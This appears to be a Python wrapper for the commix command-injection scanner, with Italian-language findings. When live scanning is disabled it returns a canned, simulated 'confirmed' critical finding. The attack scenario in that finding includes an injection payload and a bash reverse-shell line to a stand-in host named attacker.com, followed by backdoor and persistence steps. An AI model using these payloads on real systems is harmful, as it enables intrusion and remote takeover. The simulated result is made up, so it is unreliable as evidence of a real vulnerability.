"""Commix scanner wrapper."""
from __future__ import annotations

from dataclasses import dataclass
import re
import shlex
import shutil
import subprocess
from typing import Any, Dict, List

from config import settings


COMMIX_VULN_REGEX = re.compile(r"vulnerable|command injection", re.IGNORECASE)


@dataclass
class CommixScanner:
    enable_live_scans: bool = False

    def run(self, target: str) -> Dict[str, Any]:
        if not self.enable_live_scans:
            return {
                "tool": "commix",
                "status": "simulated",
                "findings": [
                    {
                        "tool": "commix",
                        "title": "OS Command Injection — Remote Code Execution confermato sul parametro 'host'",
                        "severity": "critical",
                        "description": (
                            "Commix ha confermato la presenza di una vulnerabilità di OS Command "
                            "Injection nel parametro POST 'host' dell'endpoint /api/v1/network/ping. "
                            "Il valore del parametro viene passato direttamente a una chiamata di "
                            "sistema shell (os.system() o subprocess con shell=True) senza "
                            "sanitizzazione. Utilizzando operatori di concatenazione shell "
                            "(;, &&, ||, backtick, $(...)), è possibile eseguire comandi "
                            "arbitrari sul sistema operativo del server con i privilegi "
                            "dell'utente del processo web. L'esecuzione di 'id' ha restituito "
                            "'uid=33(www-data) gid=33(www-data)'."
                        ),
                        "impact": (
                            "OS Command Injection con impatto critico e CVSS 9.8: "
                            "Remote Code Execution completa sul server, possibilità di "
                            "installare backdoor e malware persistenti, pivot verso altri "
                            "sistemi nella rete interna, esfiltrazione dell'intero filesystem, "
                            "modifica/cancellazione di dati applicativi e di sistema, "
                            "accesso ai file di configurazione con credenziali. "
                            "L'impatto è paragonabile a un accesso root non autorizzato."
                        ),
                        "attack_scenario": (
                            "1. L'attaccante identifica l'endpoint di ping: POST /api/v1/network/ping\n"
                            "   Body: host=8.8.8.8\n"
                            "2. Testa injection: POST con host=8.8.8.8;id\n"
                            "   Response: PING 8.8.8.8... uid=33(www-data) gid=33(www-data)\n"
                            "3. Reverse shell: host=8.8.8.8;bash -i >& /dev/tcp/attacker.com/4444 0>&1\n"
                            "4. Ottiene shell interattiva con privilegi www-data.\n"
                            "5. Privilege escalation locale tramite CVE note del kernel.\n"
                            "6. Installa backdoor persistente e cron job per mantenimento accesso."
                        ),
                        "recommendation": (
                            "1. IMMEDIATO: Non utilizzare mai input utente in chiamate shell. "
                            "Sostituire os.system()/subprocess(shell=True) con API native:\n"
                            "   Python: subprocess.run(['ping', '-c', '1', host], shell=False)\n"
                            "   Validare che 'host' sia un IP/hostname valido prima dell'uso.\n"
                            "2. Implementare una whitelist rigorosa dell'input: accettare solo "
                            "IP address e hostname che matchano un pattern regex valido.\n"
                            "3. Eseguire operazioni di rete tramite librerie dedicate (socket, "
                            "requests, icmplib) invece di comandi shell.\n"
                            "4. Applicare il principio del minimo privilegio: il processo web "
                            "non deve avere la capacità di eseguire comandi shell arbitrari.\n"
                            "5. Utilizzare containerizzazione (Docker) con seccomp profile "
                            "che blocchi system call pericolose come execve."
                        ),
                        "evidence": (
                            "POST /api/v1/network/ping\nhost=8.8.8.8;id\n"
                            "→ Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)"
                        ),
                        "affected_component": "Network Utility API — POST /api/v1/network/ping, parametro 'host'",
                        "path": "/api/v1/network/ping",
                        "parameter": "host",
                        "cwe": ["CWE-78", "CWE-77"],
                        "cvss_score": 9.8,
                        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        "tags": ["owasp-a03", "command-injection", "rce"],
                        "references": [
                            "https://owasp.org/Top10/A03_2021-Injection/",
                            "https://cwe.mitre.org/data/definitions/78.html",
                            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
                        ],
                    },
                ],
            }

        if not shutil.which(settings.commix_path):
            return {
                "tool": "commix",
                "status": "skipped",
                "message": "Tool commix non installato.",
                "findings": [],
            }

        command = self._build_command(target)
        try:
            completed = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=settings.scan_timeout_seconds,
                check=False,
            )
        except subprocess.TimeoutExpired:
            return {
                "tool": "commix",
                "status": "error",
                "message": "Timeout durante l'esecuzione di commix.",
                "findings": [],
            }

        findings = self._parse_findings(completed.stdout)
        message = completed.stderr.strip() if completed.stderr else ""
        status = "executed" if completed.returncode == 0 else "error"
        if completed.returncode != 0 and not message:
            message = "Errore durante l'esecuzione di commix."

        return {
            "tool": "commix",
            "status": status,
            "message": message,
            "findings": findings,
        }

    def _build_command(self, target: str) -> List[str]:
        command = [settings.commix_path, "--url", target, "--batch"]
        if settings.commix_additional_args:
            command.extend(shlex.split(settings.commix_additional_args))
        return command

    def _parse_findings(self, stdout: str) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        if COMMIX_VULN_REGEX.search(stdout or ""):
            findings.append(
                {
                    "title": "Possibile command injection",
                    "severity": "high",
                    "description": "Commix ha individuato un possibile punto di command injection.",
                    "recommendation": "Sanitizzare input e disabilitare shell execution diretta.",
                    "cwe": ["CWE-77"],
                    "tags": ["owasp-a03", "command-injection"],
                }
            )
        return findings
